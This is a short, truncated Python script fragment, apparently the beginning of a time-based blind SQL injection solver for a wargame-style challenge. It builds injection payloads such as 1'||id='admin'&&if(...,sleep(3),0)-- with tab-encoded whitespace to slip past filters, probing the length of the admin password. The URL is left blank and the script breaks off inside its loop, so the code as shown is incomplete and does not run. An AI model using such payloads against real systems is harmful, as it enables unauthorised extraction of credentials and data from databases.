import requests
import urllib
import time

length=0
url=
print("[*] start")

for j in range(0,40):
	try:
		# query="1'%09||%09id='admin'%26%26if(length(pw)="+str(j)+",sleep(3),0)%09--%09"
		query="1'%09||%09id='admin'%26%26if%091=1%09,sleep(3),0)%09--%09"

